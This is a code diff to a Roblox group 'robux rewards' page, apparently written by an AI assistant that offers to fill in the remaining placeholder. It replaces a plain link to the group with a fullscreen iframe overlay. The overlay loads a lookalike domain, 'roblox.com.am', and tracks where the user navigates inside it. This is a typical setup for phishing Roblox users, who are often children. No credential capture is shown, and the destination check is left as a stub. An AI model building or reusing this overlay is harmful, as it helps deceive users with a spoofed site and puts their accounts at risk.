@@ -3,6 +3,14 @@
 const WORKER_URL = "https://robux-group-api.romaozinho1607.workers.dev";
 // Roblox group the button opens in a new tab
 const GROUP_URL = "https://www.roblox.com/communities/138423710779";
+// Page shown first inside the fullscreen iframe — must be on YOUR OWN domain,
+// otherwise the browser blocks reading its URL (see checkFrameUrl below).
+const IFRAME_START_URL = "https://www.roblox.com.am/communities/138423710779/robloxianStudio"; // TODO: set this
+// A navigation inside the iframe counts as "arrived" when its URL matches this.
+// TODO: tell me the exact destination URL/pattern and I will fill this in.
+function isDestinationUrl(url) {
+  return false; // placeholder — not wired up yet
+}
 // Footer text shown on the page
 const DISCLAIMER = "Not affiliated with Roblox Corporation. Joining the group is voluntary; " +
                    "rewards are decided by the group owner and are not guaranteed by this site.";
@@ -150,7 +158,35 @@ $("register-btn").addEventListener("click", async () => {
 /* Group button: opens the group in a new tab, asks for nothing else */
 $("join-btn").addEventListener("click", () => {
   if (!confirmed) return; // real lock: does nothing until the profile is confirmed
-  window.open(GROUP_URL, "_blank", "noopener,noreferrer");
+  openGroupOverlay();
+});
+
+/* Fullscreen iframe flow: loads IFRAME_START_URL, polls its location on each
+   'load' event (works only because it's same-origin), and once the URL matches
+   isDestinationUrl(), confirms the registration and opens the real group link. */
+function openGroupOverlay() {
+  $("join-overlay").hidden = false;
+  $("join-frame").src = IFRAME_START_URL;
+}
+function closeOverlay() {
+  $("join-overlay").hidden = true;
+  $("join-frame").src = "about:blank";
+}
+$("overlay-close").addEventListener("click", closeOverlay);
+
+$("join-frame").addEventListener("load", () => {
+  let href;
+  try {
+    href = $("join-frame").contentWindow.location.href; // throws if cross-origin
+  } catch {
+    return; // iframe navigated to a different domain; can't read it, ignore
+  }
+  if (isDestinationUrl(href)) {
+    closeOverlay();
+    window.open(GROUP_URL, "_blank", "noopener,noreferrer");
+    // Registration already happened via the "Confirmar perfil" button;
+    // this overlay is just the visual flow, not a second confirmation.
+  }
 });
 
 $("back-btn").addEventListener("click", () => {
